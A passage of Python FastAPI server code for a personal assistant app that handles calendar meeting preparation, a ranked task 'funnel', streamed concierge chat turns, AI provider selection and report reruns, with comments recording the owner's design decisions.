    m = store.get_message(int((body or {}).get('message_id') or 0))
    if not m or m.get('TaskId') != tid: raise HTTPException(404, 'that message is not on this task')
    from . import terminal, origin
    # a full-permission session is the one a stranger's words must never be typed into (its reviewer is the bypass)
    if origin.of_message(store, m)[0] == 'stranger' and terminal.mode_of_task(tid) not in ('', 'auto'):
        raise HTTPException(409, "this session runs with full permissions - start it again and it will run in auto mode, then hand it the stranger's message")
    if not terminal.say_to_task(store, tid, m, ACTOR):
        raise HTTPException(422, 'no live agent session on this task - start one and it gets the thread anyway')
    return {'ok': True}

@app.get('/api/calendar/today')
def calendar_today():
    """Today's meetings with who is in them and what they are about - the digest panel's strip."""
    from . import calendar as cal
    try: return cal.today(store)
    except Exception as e: return {'date': None, 'now': None, 'events': [], 'tz': None, 'errors': [str(e)[:200]]}

def prep_key(start, subject) -> str:
    """What ties a prep row to the invite it is about: the prep message's conversation id. (The Timeline drew a prep
    under its meeting by building the same string; it went with the Timeline, 2026-10-15.)"""
    return f"calendar:{start or ''}:{(subject or 'the meeting').strip()[:120]}"

class MeetingPrepBody(BaseModel):
    """The event as the page already has it, plus what the owner wants done about it."""
    subject: str | None = None; start: str | None = None; end: str | None = None
    where: str | None = None; organizer: str | None = None; who: list[str] = []
    about: str | None = None; link: str | None = None; status: str | None = None
    all_day: bool = False
    instruction: str | None = None
    # kept so a page loaded before the switch to the chat assistant still posts cleanly; the
    # prep conversation picks its own provider inside the workspace
    agent: str | None = None; model: str | None = None

@app.post('/api/calendar/prep')
def calendar_prep(body: MeetingPrepBody):
    """"Get me ready for this one": the meeting, handed to an agent with your
    own prompt. The invite (when, where, who, what it says) becomes the task's context and your
    prompt is the ask, so the session opens already knowing which meeting it is about.

    It opens the ASSISTANT'S CHAT, not a coding session (owner, 2026-09-01). Getting ready for
    a meeting is reading, checking and thinking - there is no checkout to work in, and a CLI in
    the agent's own folder was the wrong tool wearing the right name. Kind `general` plus the ask
    tag is exactly what the Board and + New create, so the chat opens with the brief already
    asked (website/src/newTask.js, GeneralWorkspace).
    """
    tid = _prep_task(body, (body.instruction or '').strip() or 'Get me ready for this meeting.')
    return {'taskId': tid, 'ref': task_ref(tid), 'agent': 'assistant', 'chat': True}

# PREPARE (the owner, 2026-10-25: "add prepare that creates agent to research about person and topic through your mails"): the
# meeting card's button. An agent - the general profile - reads what the saved mail and chats say about each person on the invite
# and about its subject, and its answer is the brief, filed on the meeting's own task. It reads and writes to nobody.
PREPARE_ASK = ("Prepare me for this meeting. Research the people on the invite and its subject through my saved mail and chats in "
               "Taskuary: who each person is to me, what we last said to each other, what is still open between us, and what has been "
               "said about the subject. The reads below are where to start - search further for anything they leave open. Then answer "
               "with a SHORT brief: a line or two per person, the open questions, and what I should be ready to answer. Write to nobody.")

@app.post('/api/calendar/prepare')
def calendar_prepare(body: MeetingPrepBody, background: BackgroundTasks):
    """Prepare on a meeting card: the meeting's task, with what the mail says about its people and subject, and the general
    agent started on it. Pressed twice it is the same task - the agent already on it is not started again."""
    from . import mailsearch
    subject = (body.subject or 'the meeting').strip()[:120]
    ref = f"calendar:{body.start or ''}:{subject}"[:200]
    tid = (store._one("SELECT TaskId FROM task WHERE SourceRef=? AND Status NOT IN ('done','dropped') ORDER BY TaskId DESC LIMIT 1", (ref,)) or {}).get('TaskId')
    if not tid:
        reads = mailsearch.meeting_reads(store, [*(body.who or []), *([body.organizer] if body.organizer else [])], subject)
        said = (body.instruction or '').strip()                # the owner's own words lead, the research under them
        tid = _prep_task(body, f'{said}\n\n{PREPARE_ASK}' if said else PREPARE_ASK,
                         f"\n\nWHAT YOUR SAVED MAIL ALREADY SAYS (ids open with `taskuary --message ID`):\n{mailsearch.says(reads)}" if reads else '')
    out = dispatch_task(tid, DispatchBody(kind='general'), background)
    return {**out, 'taskId': tid, 'ref': task_ref(tid)} if isinstance(out, dict) else out

def _prep_task(body: MeetingPrepBody, ask: str, reads: str = '') -> int:
    from . import calendar as cal, ownwork
    subject = (body.subject or 'the meeting').strip()[:120]
    brief = cal.prep_brief(body.model_dump())
    tid = store.create_task({'Title': f'Prep: {subject}'[:200], 'Summary': f'{ask}\n\n{brief}{reads}',
                             'Kind': 'general', 'Tags': ASK_TAG, 'Source': 'calendar',
                             'SourceRef': f"calendar:{body.start or ''}:{subject}"[:200]}, ACTOR)
    # The row for this work belongs to the INVITE. Left to ownwork.ensure it became a separate
    # line stamped whenever the session happened to open - so a meeting and the prep for it sat an
    # hour apart on a rail that is meant to read as a day. Same ConversationId as the event keys
    # them together, and ensure() then finds a row already here and adds nothing.
    store.add_message({'TaskId': tid, 'ExternalId': f'prep:{tid}', 'ConversationId': prep_key(body.start, subject),
                       'Channel': ownwork.CHANNEL, 'SourceName': ownwork.SOURCE,
                       'Subject': f'Prep: {subject}'[:200], 'FromName': 'You', 'Status': 'routed',
                       'SentAt': datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'BodyText': ask})
    store.audit('task', tid, 'create_from_meeting', ACTOR, detail={'subject': subject, 'start': body.start})
    return tid

@app.get('/api/calendar/upcoming')
def calendar_upcoming(hours: int = 72, force: bool = False):
    """The Timeline's 'coming up' band: the owner's next events, cached five minutes."""
    from . import calendar as cal
    try: return cal.upcoming(store, max(1, min(hours, 96)), force)
    except Exception as e: return {'events': [], 'tz': None, 'errors': [str(e)[:200]], 'fetched': None}

# ── the funnel: what is being worked, what waits and in what order (rank.py) ────────────
@app.get('/api/funnel')
def funnel(): return rank.funnel(store)

@app.post('/api/funnel/{tid}/pin')
def funnel_pin(tid: int):
    """The owner's override: this one is next. Pinned = top value; it starts at the next free slot."""
    if not any(q['TaskId'] == tid for q in store.queued_dispatches()): raise HTTPException(404, 'that task is not waiting')
    store.set_dispatch_value(tid, rank.PIN, 'pinned by you')
    store.audit('task', tid, 'funnel_pin', ACTOR)
    blackboard.drain_later(store, 0.1)
    return {'ok': True}

@app.post('/api/funnel/{tid}/later')
def funnel_later(tid: int):
    if not any(q['TaskId'] == tid for q in store.queued_dispatches()): raise HTTPException(404, 'that task is not waiting')
    store.set_dispatch_value(tid, rank.LATER, 'pushed back by you')
    store.audit('task', tid, 'funnel_later', ACTOR)
    return {'ok': True}

@app.post('/api/tasks/{tid}/dispatch/retry')
def dispatch_retry(tid: int):
    """The owner's Retry after a start failed or ran out of attempts: a new bounded cycle, tried now (PW-087)."""
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    if not store.dispatch_retry(tid): raise HTTPException(404, 'that task has no queued start')
    store.add_comment(tid, ACTOR, 'human', 'Retrying the start - a fresh set of attempts.')
    store.audit('task', tid, 'dispatch_retry', ACTOR)
    blackboard.drain(store)
    return {'ok': True, 'queued': _queued_info(store.get_dispatch(tid))}

@app.delete('/api/tasks/{tid}/dispatch')
def dispatch_cancel(tid: int):
    """Cancel queued start: the pending dispatch goes; the task is neither deleted nor completed (PW-087)."""
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    if not store.get_dispatch(tid): raise HTTPException(404, 'that task has no queued start')
    store.clear_dispatch(tid)
    # ...and the agent comes off it: left assigned, the card still read "waiting to start - nothing has started it"
    # (A5, 2026-09-25). The task is yours; Send to agent hands it on again.
    if str((store.get_task(tid) or {}).get('Assignee') or '').startswith('agent:'):
        store.update_task(tid, {'Assignee': None}, ACTOR)
    store.add_comment(tid, ACTOR, 'human', 'Cancelled the queued start - the task stays on your list.')
    store.audit('task', tid, 'dispatch_cancel', ACTOR)
    return {'ok': True}

@app.get('/api/funnel/waiting')
def funnel_waiting():
    """What is ranked and still waiting to be judged - what the rail's "250 more" opens. Subjects
    and senders straight off the arrivals, so looking costs no model call."""
    from . import rank
    return rank.waiting(store)


@app.post('/api/funnel/rerank')
def funnel_rerank(): return {'updated': rank.rerank(store, force=True)}

# ── the pipe and the concierge (funnel.py, concierge.py): what comes next, said out loud ──────
class SettleBody(BaseModel): key: str; verb: str = 'done'; hours: float | None = None; only: str | None = None; read: bool = False; shown: dict | None = None; put_down: bool = False; fyi: int | None = None; pressed: str | None = None
class SurfaceBody(BaseModel):
    key: str | None = None
    only: str | None = None
    include_surfaced: bool = False
    exclude: str | None = None
    selection_revision: str | None = None
    expected_next_key: str | None = None
    leaving: str | None = None          # the item Next is walking away from: read on the way out (concierge.move_on)
    expected_next_members: list[str] | None = None
    fyi: int | None = None              # how many plain FYI rows the page wants whole in the rail that rides along (funnel.page_fyi)
    blind: bool = False                 # pressed with nothing on the table (processing_navigation.reserve)
class ConciergeSayBody(BaseModel): text: str; key: str | None = None; context_mid: int | None = None; open_card: str | None = None; images: list[str] = []
class ConciergeActBody(BaseModel): key: str; verb: str; hours: float | None = None

def _encoded(content) -> Response:
    """An answer that carries the pile, encoded HERE on the request's worker thread. Handed back as a dict, FastAPI runs
    jsonable_encoder over it on the event loop: 0.2-1.2 s for a big mailbox's 3 MB pile, during which every other request
    waits, index.html included (perf 2026-10-19). Byte for byte what JSONResponse renders; anything json cannot take goes
    through jsonable_encoder exactly as before."""
    from fastapi.encoders import jsonable_encoder
    return Response(json.dumps(content, ensure_ascii=False, allow_nan=False, indent=None, separators=(',', ':'),
                               default=jsonable_encoder).encode('utf-8'), media_type='application/json')


def _pile_payload(force: bool = False, current: str = None, only: str = None,
                  include_surfaced: bool = False, exclude: str = None, fyi: int = None) -> dict:
    """The pile as the page draws it, with the selection token Next echoes. One road for the GET,
    for the turn that carries the rail in its answer, and for the settle that does the same."""
    from . import funnel
    from .funnel_selection import capture_selection
    from .processing_navigation import fields
    started = time.time()
    # funnel.pile owns invalidation and single-flight across open tabs. Capture navigation
    # from that exact cached pile; capture_selection accepts it specifically so this endpoint
    # does not rebuild canonical membership a second time.
    cached = funnel.pile(store, force=force) if only is None else None
    events = (cached.get('events') or []) if cached is not None else funnel.announce(store)
    capture = capture_selection(store, only=only, include_surfaced=include_surfaced,
                                exclude=exclude, pile=cached)
    # generated_at: when this read BEGAN (server clock, ms) - the page compares it to its live events
    # to know which writes this read already saw (funnelPile.coveredByReload); transient, outside the revision
    # display_revision: the slot is held where it always sat - the final present() below fills it over the rows sent
    p = {**capture.pile, 'display_revision': None, **fields(store, capture), 'generated_at': int(started * 1000),
         'alerts': funnel.desk_alerts(funnel.alerts(store, capture.pile['items'])), 'events': events}
    # ...and what the page is HOLDING: an item whose review was decided (or whose task closed)
    # leaves the pile, and nothing told the page - so a sent reply sat on the table as
    # "reply pending" for as long as the tab stayed open (the owner, 2026-09-03: "why is it
    # showing back up if the ai agent replied, i edited it and sent??"). Looked up in the build
    # the pile came from, not a second one.
    if current: p = {**p, 'current': funnel.next_item(store, current, items=funnel.full_items(store) if cached is not None else None)}
    # Current is query-specific and may be absent from the ordinary pile. Include
    # its complete presentation in the revision after attaching it to the response.
    # `fyi`: the page's own rail pages its plain FYI tail (funnel.page_fyi) - AFTER the selection was captured from the whole
    # pile, so the token Next echoes is the one a full read gives. Whatever is on the table or picked next is sent whole.
    if fyi is not None:
        p = funnel.page_fyi(p, max(0, int(fyi)), keep=(current, exclude, p.get('expected_next_key'), *(p.get('expected_next_members') or ())))
    p = funnel.present(store, p)
    # PREPARED NEXT (2026-10-20): the answer a press would give for THIS selection, so the page draws it at the press and the
    # press's own answer only confirms it (concierge.prepare_next). Outside the display revision: it is made of rows it covers.
    from . import concierge
    try: p['prepared_next'] = concierge.prepare_next(store, capture, p.get('selection_revision'))
    except Exception as e: logger.debug(f'no prepared Next: {e}'); p['prepared_next'] = None
    return p

def _pile_along(only: str = None, include_surfaced: bool = False, exclude: str = None, fyi: int = None) -> dict | None:
    """The rail read once after a write and carried in that write's answer, so the page holds it
    instead of asking for the same rows again (design B, 2026-09-17: a press of Next was two of these
    reloads at 1.5-2 s each). Scoped the way the page will hold it. Never the answer's failure: the
    page falls back to its own load when nothing rides along."""
    try: return _pile_payload(force=True, only=only, include_surfaced=include_surfaced, exclude=exclude, fyi=fyi)
    except Exception as e:
        logger.debug(f'the pile did not ride along: {e}'); return None

@app.get('/api/funnel/pile')
def funnel_pile(force: bool = False, current: str = None, only: str = None,
                include_surfaced: bool = False, exclude: str = None, fyi: int = None):
    """The ranked pile the Assistant page draws: next-first, every item with the words it rests
    on, plus the alerts that interrupt. Cached a few seconds - it is polled while the page is open."""
    from .funnel_selection import SelectionUnavailable
    try: return _encoded(_pile_payload(force, current, only, include_surfaced, exclude, fyi))
    except SelectionUnavailable as error:
        raise HTTPException(503, error.detail) from error
    except processing_all.AllError as error:
        raise HTTPException(error.status, error.detail) from error

@app.post('/api/funnel/settle')
def funnel_settle(body: SettleBody):
    from . import concierge, funnel, general
    # `read` rides only on 'surfaced': the Assistant Game's Next is the chat's Next - shown is read (2026-09-06)
    # `shown`: the card's {key: view_revision}, so what landed after it was drawn stays unread (funnel.settle)
    # `put_down`: the Assistant Game's Next is the chat's Next - walked past, not merely shown (move_on)
    try: out = funnel.settle(store, body.key, body.verb, ACTOR, body.hours, read=body.read and body.verb == 'surfaced', shown=body.shown,
                             put_down=body.put_down and body.verb == 'surfaced')
    except ValueError as e: raise HTTPException(422, str(e))
    if body.verb in ('done', 'later', 'skip'):                              # settled: off the table, and nothing chosen in its place
        dock = general.dock_task(store, ACTOR)[0]['TaskId']
        if concierge.current_key(store, dock) == body.key: concierge.set_current(store, dock, None, ACTOR)
        # ...and the card wears what its press did, from the server too, so a reload draws it: "All read, next" on an fyi batch folded with
        # its badge on the page and lost it on the next read - this road, not Next's, is the one its button takes (concierge._stamp_next)
        # ...a button's own word, never free text: anything else is not a press of this app's
        if body.pressed and body.pressed in buttons.labels(): concierge._stamp_next(store, dock, body.key, body.pressed)
        # the table is empty now, so the page's next scope excludes nothing: the rail comes back captured that way
        out = {**out, 'pile': _pile_along(only=body.only, fyi=body.fyi)}
    return _encoded(out)

def _warm_assistant():
    """The Assistant's CLI started before it is asked (concierge.warm) - on a thread of its own, so nothing here waits on it."""
    from . import concierge
    concierge.warm(store, ACTOR)


@app.get('/api/concierge')
def concierge_state():
    """The conversation as it stands: the dock task, its turns with their cards, the AI choices."""
    from . import concierge, general
    task, _ = general.dock_task(store, ACTOR)
    _warm_assistant()              # the page is open: its first ask finds the CLI already running
    options = general.provider_options(store)
    pick = concierge.pick(store)
    chosen = next((o for o in options if o['pick'] == pick), None)
    model = str(store.get_setting(concierge.MODEL_KEY) or '').strip() or (chosen or {}).get('model') or ''
    if pick.startswith('cli:') and not str(store.get_setting(concierge.MODEL_KEY) or '').strip():
        model = concierge.ASSISTANT_DEFAULT.get(re.split(r'[\\/]', str((chosen or {}).get('label') or pick[4:])).pop().split(' ')[0].lower(), model) or model
    from . import remote_assistant
    return {'task': task, 'ref': task_ref(task['TaskId']), 'messages': concierge.history(store, task['TaskId']),
            # the persisted Current, validated against the pile - never the last card of the history (PW-162)
            'current': concierge.restore_current(store, task['TaskId']),
            'providers': general.brain_options(store, keep=pick), 'pick': pick,
            'provider': (chosen or {}).get('label') or pick, 'model': model,
            # the chats this walk can be handed to, and the one it is in right now
            'doorways': remote_assistant.doorways(store), 'handoff': remote_assistant.handoff(store),
            # the demo's own brain is a script (demo.brain): "No AI connected" over a chat that answered was a lie (the UX walk, 2026-10-22)
            'scripted': demo.enabled()}

class HandoffBody(BaseModel): channel: str

# NO DESKTOP LOCK WHILE THE WALK IS ON THE PHONE (the owner, 2026-10-23: "we used to have that if we were talking on the phone it
# would lock the screen on desktop but we should probably get rid of that"): every desktop turn below runs as it would without a
# hand-off, and the tab follows the walk's Current. A reply answered twice is still refused at the act (operations' revision pin,
# verdicts.decide's pending check).

@app.post('/api/concierge/handoff')
def concierge_handoff(body: HandoffBody):
    """Send the walk to a chat the owner already has connected: it says hello there. The tab keeps working."""
    from . import remote_assistant
    try: return remote_assistant.start_handoff(store, body.channel, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))
    except RuntimeError as e: raise HTTPException(502, str(e))       # the bridge or the bot could not be reached

@app.post('/api/concierge/handoff/end')
def concierge_handoff_end():
    """Take it back: the chat is told the walk is over there, and the desktop is its own again."""
    from . import remote_assistant
    return remote_assistant.end_handoff(store, ACTOR)

class ConciergeAiBody(BaseModel): pick: str | None = None; model: str | None = None

@app.post('/api/concierge/ai')
def concierge_ai(body: ConciergeAiBody):
    """Which AI speaks on the Assistant tab - configuration, not a tab-local preference. Empty pick =
    back to the default (the CLI agent on its quick gear). A change starts a fresh CLI conversation."""
    from . import concierge, general
    store.set_setting(concierge.AI_KEY, str(body.pick or ''), ACTOR)
    store.set_setting(concierge.MODEL_KEY, str(body.model or ''), ACTOR)
    task, _ = general.dock_task(store, ACTOR)
    store.set_setting(f"{concierge.SID_KEY}:{task['TaskId']}", '', ACTOR)
    from . import clipool; clipool.close(f"{concierge.LIVE_KEY}:{task['TaskId']}")   # a new brain is a new process
    _warm_assistant()              # ...started now, on the brain just chosen
    return {'pick': concierge.pick(store), 'model': body.model or ''}

@app.get('/api/funnel/mutes')
def funnel_mutes():
    """The standing "stop showing me these" rules - written when the owner sweeps the pipe with a
    reason, or tells us in advance. Listed so they are never a black box, and removable."""
    from . import funnel                      # module-scope `funnel` here is the rank route, not the module
    return {'data': funnel.mutes(store)}

@app.delete('/api/funnel/mutes/{idx}')
def funnel_unmute(idx: int):
    from . import funnel
    rules = funnel.mutes(store)
    if not 0 <= idx < len(rules): raise HTTPException(404, 'no such rule')
    gone = rules.pop(idx)
    store.set_setting(funnel.MUTES_KEY, json.dumps(rules), ACTOR)
    funnel.invalidate()
    store.audit('setting', 0, 'funnel_unmute', ACTOR, 'human', {'rule': gone})
    return {'ok': True, 'data': rules}

@app.get('/api/concierge/chats')
def concierge_chats(limit: int = 25, before: int = None):
    """Past chats, newest first, a page at a time; `next` is the cursor for the page before this one. Reading
    the list writes nothing (PW-157)."""
    from . import concierge
    limit = max(1, min(int(limit or 25), 100))
    rows = concierge.chats(store, ACTOR, limit=limit, before=before)
    return {'data': rows, 'next': rows[-1]['taskId'] if len(rows) >= limit else None}

@app.get('/api/concierge/chats/{tid}')
def concierge_chat(tid: int):
    from . import concierge, general
    t = store.get_task(tid)
    if not t or not general.is_dock(t): raise HTTPException(404, 'no such chat')
    return {'task': t, 'messages': concierge.history(store, tid)}

@app.post('/api/concierge/chats/{tid}/continue')
def concierge_chat_continue(tid: int, background: BackgroundTasks):
    """Pick an earlier chat back up: today's is archived and that one is the live chat again. An earlier chat could only be
    read, and the one way forward on the panel was the Advisor's "New task" - going back to where a conversation left off
    meant making a task of it (TQ-1161). Its model session went with the archive; every turn carries CONVERSATION SO FAR
    from the chat's own rows, so the next one picks up from what was said."""
    from . import general
    from .processing_navigation import chat_change
    t = store.get_task(tid)
    if not t or not general.is_dock(t): raise HTTPException(404, 'no such chat')
    with chat_change(store):
        live, _ = general.dock_task(store, ACTOR)
        if live['TaskId'] == tid: return {'task': live, 'ref': task_ref(tid), 'archivedTaskId': None}
        old = _archive_dock(background)
        store.update_task(tid, {'Status': 'open'}, ACTOR)
        store.set_setting('assistant_dock_task_id', str(tid), ACTOR)
        store.audit('task', tid, 'continue_assistant_dock', ACTOR)
        _warm_assistant()
        return {'task': store.get_task(tid), 'ref': task_ref(tid), 'archivedTaskId': old['TaskId']}

@app.post('/api/concierge/next')
def concierge_next(body: SurfaceBody = None):
    """Pull the next thing out of the pipe - or the one named, or the next piece of mail - and say it."""
    from . import concierge
    body = body or SurfaceBody()
    reservation = _navigation_reservation(body)
    if reservation:
        from .processing_navigation import NavigationStale
        from .funnel_selection import SelectionUnavailable
        try:
            def _surface(selected, guard, dock):
                return concierge.surface(store, actor=ACTOR, only=body.only, include_surfaced=body.include_surfaced,
                                         exclude=body.exclude, selection=selected, commit_guard=guard, bound_dock=dock,
                                         leaving=body.leaving)
            out = _with_pile(reservation.run(_surface, ACTOR), body)
            _refresh_after(out)                      # the change-check follows the four (design C)
            return _encoded(out)
        except NavigationStale as error:
            raise HTTPException(409, error.detail) from error
        except SelectionUnavailable as error:
            raise HTTPException(503, error.detail) from error
    if body.key: _refresh_chat_key(body.key)     # a named pull refreshes ITS item first: the item is the subject (PW-050)
    out = _with_pile(concierge.surface(store, body.key, actor=ACTOR, only=body.only,
                                       include_surfaced=body.include_surfaced, exclude=body.exclude, leaving=body.leaving), body)
    if not body.key: _refresh_after(out)         # ...and the walk's Next answers first, then asks the provider (design C)
    return _encoded(out)

def _pile_rides(out: dict, body) -> bool: return not body.key and bool((out.get('item') or {}).get('key'))


def _with_pile(out: dict, body) -> dict:
    """A Next answer with the rail as the turn left it. The item is on the table, so the page will hold
    the rail with everything but it - that is the scope it is captured under. The walk running out
    (no item) leaves the page to its own load; a named pull (`key`) is not a walk."""
    if not _pile_rides(out, body): return out
    return {**out, 'pile': _pile_along(only=body.only, include_surfaced=body.include_surfaced, exclude=out['item']['key'],
                                       fyi=getattr(body, 'fyi', None))}

@app.post('/api/concierge/open')
def concierge_open():
    """The first line of a new chat: the day in a breath, and the buttons that start the walk."""
    from . import concierge
    return concierge.open_day(store, actor=ACTOR)

_ANSWERING = set()        # the cancel Event of every answer being written in the Assistant tab (concierge_stream)

@app.post('/api/concierge/stop')
def concierge_stop():
    """The Stop beside the typing dots. An answer that hung had no way out: New chat is refused while one is being
    written. A CLI brain is killed by its cancel; the page also stops waiting, so the owner has the chat back either way."""
    live = list(_ANSWERING)
    for c in live: c.set()
    return {'stopped': len(live)}

class ArriveBody(BaseModel): leaving: bool = False

@app.post('/api/concierge/arrive')
def concierge_arrive(body: ArriveBody = ArriveBody()):
    """The owner is in front of the chat (the page opened, the window got focus) or just left it. The first time on a new
    day, or back after a long gap, the chat opens with the day in a breath (welcome.arrive) - code, never a model call."""
    from . import welcome
    return welcome.arrive(store, actor=ACTOR, leaving=body.leaving)

class ConciergeStreamBody(BaseModel):
    mode: str = 'say'; text: str | None = None; key: str | None = None; only: str | None = None; context_mid: int | None = None
    open_card: str | None = None                  # the card browsed open in the canvas, said in words
    images: list[str] = []                        # pictures sent with the line (/api/prompt-image)
    include_surfaced: bool = False; exclude: str | None = None; leaving: str | None = None
    blind: bool = False                 # pressed with nothing on the table (processing_navigation.reserve)
    selection_revision: str | None = None
    expected_next_key: str | None = None
    expected_next_members: list[str] | None = None
    fyi: int | None = None


def _navigation_reservation(body):
    """Validate modern selection fields before dock, model, refresh or stream work."""
    from .processing_navigation import reserve, NavigationStale
    from .funnel_selection import SelectionUnavailable
    names = {'selection_revision', 'expected_next_key', 'expected_next_members'}
    supplied = names.intersection(body.model_fields_set)
    if not supplied:
        return None  # Compatibility for older callers during the staged cutover.
    if (supplied != names or body.key or getattr(body, 'mode', 'next') != 'next'
            or not re.fullmatch(r'[0-9a-f]{64}', body.selection_revision or '')
            or body.expected_next_members is None):
        raise HTTPException(422, 'automatic navigation requires the complete selection binding')
    try:
        return reserve(store, selection_revision=body.selection_revision,
                       expected_next_key=body.expected_next_key,
                       expected_next_members=body.expected_next_members,
                       only=body.only, include_surfaced=body.include_surfaced, exclude=body.exclude,
                       # nothing on the table - the walk's start: no item the owner saw that a moved pick could skip past
                       blind=bool(getattr(body, 'blind', False)))
    except NavigationStale as error:
        raise HTTPException(409, error.detail) from error
    except SelectionUnavailable as error:
        raise HTTPException(503, error.detail) from error

@app.post('/api/concierge/stream')
async def concierge_stream(body: ConciergeStreamBody):
    """One turn of the assistant, streamed: the CLI's tool calls and progress as they happen, then
    `done` with the same payload the plain endpoints return. Same shape as the task assistant's
    stream; the browser walking away detaches, and the page's Stop sets `cancel` (/api/concierge/stop)."""
    from . import concierge
    from .processing_navigation import NavigationStale
    from .funnel_selection import SelectionUnavailable
    def admit():
        # the walk handed to a phone no longer locks this road (2026-10-23): both surfaces walk, the desk follows
        return _navigation_reservation(body)
    admission = asyncio.create_task(asyncio.to_thread(admit))
    try:
        reservation = await asyncio.shield(admission)
    except asyncio.CancelledError:
        def release_admission(done):
            try:
                held = done.result()
                if held: held.close()
            except Exception:
                pass
        admission.add_done_callback(release_admission)
        raise
    loop, events, cancel = asyncio.get_running_loop(), asyncio.Queue(), threading.Event()
    rides = [False]                     # set before `done` is queued: the stream then ends on the `pile` that follows it
    def put(e):
        # encoded here, on the turn's thread: the `done` of a Next carries the whole rail, and json.dumps of it on the loop
        # held every other request (perf 2026-10-19). What cannot be encoded goes as it is and fails where it always did.
        try: e = (e.get('type'), json.dumps(e, default=str) + '\n')
        except Exception: pass
        try: loop.call_soon_threadsafe(events.put_nowait, e)
        except RuntimeError: pass
    def trace(kind, name, detail):
        if kind == 'prompt' or (kind == 'tool' and name == 'cli'): return    # the prompt and the launch line are ours, not news
        put({'type': kind, 'name': name, 'detail': detail if isinstance(detail, (dict, str)) else str(detail)})
    def work():
        _ANSWERING.add(cancel)
        try:
            # the item first, then its source (PW-050): a named item refreshes itself; Next without a key refreshes
            # what it is about to surface, every channel of an FYI batch once, and re-picks if the pile moved
            started = []
            def fetched(n):                      # once per turn, as the new lines land - the result line follows
                if not started: started.append(n); put({'type': 'context_update', 'say': RETRIAGE_STARTED, 'stage': 'started', 'new': n})
            # A typed question polls NOTHING up front: the words are read first, and the item is
            # brought in below only if the answer turns out to be about it. The walk's Next does not either:
            # it answers from the rail and the change-check follows the four (_refresh_after, design C,
            # 2026-09-17) - and neither does a row you click (mode 'next' with its key). That one used to wait
            # on its mailbox first, 9 of the 12 seconds a click took (the owner, 2026-10-01: "open now, check
            # after"); what lands after it reaches the page the way it does for Next. An ACTION - a reply, an
            # approval, an agent - still reads the provider before it acts (_refresh_chat_context's gate).
            if body.key and body.mode not in ('say', 'next'): freshness = _refresh_chat_key(body.key, body.context_mid, on_fetched=fetched)
            else: freshness = {}
            if freshness.get('polled'):
                put({'type': 'tool_call', 'name': 'sync_messages',
                     'detail': {'new': freshness.get('added', 0)}})
            # said BEFORE the answer, once per new revision (PW-052/057): the owner reads that the thread moved
            # and went through triage, then the assistant's read of it
            # Surfacing an item IS about that item, so the owner reads that it moved before its
            # introduction. A typed question is not: it is triaged first, and the item is brought in
            # only when the answer turns out to be about it (see concierge_say).
            notice = _notice_once(freshness) if body.mode != 'say' else ''
            if notice: put({'type': 'context_update', 'say': notice})
            if body.mode == 'open': out = concierge.open_day(store, actor=ACTOR, trace=trace, cancel=cancel)
            elif body.mode == 'next':
                if reservation:
                    out = reservation.run(lambda selected, guard, dock: concierge.surface(
                        store, actor=ACTOR, only=body.only, trace=trace, cancel=cancel,
                        include_surfaced=body.include_surfaced, exclude=body.exclude,
                        selection=selected, commit_guard=guard, bound_dock=dock, leaving=body.leaving), ACTOR)
                else:
                    out = concierge.surface(store, body.key, actor=ACTOR, only=body.only, trace=trace, cancel=cancel,
                                            include_surfaced=body.include_surfaced, exclude=body.exclude,
                                            leaving=body.leaving)
            else: out = concierge.say(store, body.text or '', body.key, actor=ACTOR, trace=trace, cancel=cancel, item=freshness.get('item'),
                                      open_card=body.open_card, images=prompt_images(body.images))
            if notice: out['context_update'] = notice
            # THE CARD FIRST, THE RAIL AFTER IT (the owner, 2026-10-20): the rail that rides along (design B) is read after the
            # turn's writes, and that read was most of a press - the card waited on it. `done` goes now and says the rail
            # follows; the rail comes as its own `pile` event, and the page keeps the rail it has until that one lands.
            # the page drew the prepared answer at the press: this says whether the committed one is the same (prepare_next)
            if body.mode == 'next' and not body.key: out['answer_hash'] = concierge.answer_hash(out)
            if body.mode == 'next' and _pile_rides(out, body):
                rides[0] = True
                put({'type': 'done', **out, 'pile_follows': True})
                put({'type': 'pile', 'pile': _with_pile(out, body).get('pile')})
            else: put({'type': 'done', **out})
            if body.mode == 'next': _refresh_after(out)     # after the answer, never before it (design C) - a clicked row too
        except NavigationStale as error:
            put({'type': 'error', 'code': 'selection_stale', 'detail': error.detail, 'error': str(error)})
        except SelectionUnavailable as error:
            put({'type': 'error', 'code': 'selection_unavailable', 'detail': error.detail, 'error': str(error)})
        except processing_all.AllError as error:      # the page retries on this code once membership settles
            put({'type': 'error', 'code': error.detail['code'], 'detail': error.detail, 'error': str(error)})
        except concierge.Stopped:                     # the page stopped waiting already; nothing of the turn was kept
            put({'type': 'error', 'code': 'stopped', 'error': 'Stopped.'})
        except Exception as e:
            logger.warning(f'concierge stream failed: {e}')
            put({'type': 'error', 'error': str(e)})
        finally:
            _ANSWERING.discard(cancel)
            if reservation: reservation.close()
    try:
        threading.Thread(target=work, daemon=True).start()
    except BaseException:
        if reservation: reservation.close()
        raise
    async def generate():
        while True:
            e = await events.get()
            kind, line = e if isinstance(e, tuple) else (e.get('type'), json.dumps(e, default=str) + '\n')
            yield line
            if kind in ('pile', 'error') or (kind == 'done' and not rides[0]): break
    return StreamingResponse(generate(), media_type='application/x-ndjson', headers={'Cache-Control': 'no-cache, no-transform'})

@app.post('/api/reports/{sid}/rerun')
def report_rerun(sid: int):
    """Run one report now and hand back what it produced - the assistant's door (an agent token may
    not touch /api/sources, and should not: this changes no configuration). The report lands on the
    Timeline exactly as a scheduled run would."""
    return _rerun_report(sid)


def _spawn_rerun(fn):
    """The rerun's own thread door, so a test can run the work inline without patching the global
    Thread class - which left a refresh thread unjoinable in a later test's teardown (2026-09-18)."""
    threading.Thread(target=fn, daemon=True).start()


def _rerun_report(sid: int, asked: dict | None = None, by: str = 'manual') -> dict:
    """The rerun itself. `asked` is the chat the ask came from (remote_assistant.asking): a run started
    from WhatsApp used to land on the Timeline and tell the chat nothing (the owner, 2026-09-18: "would
    that come back?"). When it lands, that chat gets the summary. `by`: who pressed it - the owner's
    Run now, or the assistant (_run_operation) - written on a workflow's task as what started it."""
    src = store.get_source(sid)
    if not src or src.get('Channel') != 'report': raise HTTPException(404, 'no such report')
    try: title = json.loads(src.get('ConfigJson') or '{}').get('title') or src.get('Address')
    except ValueError: title = src.get('Address')
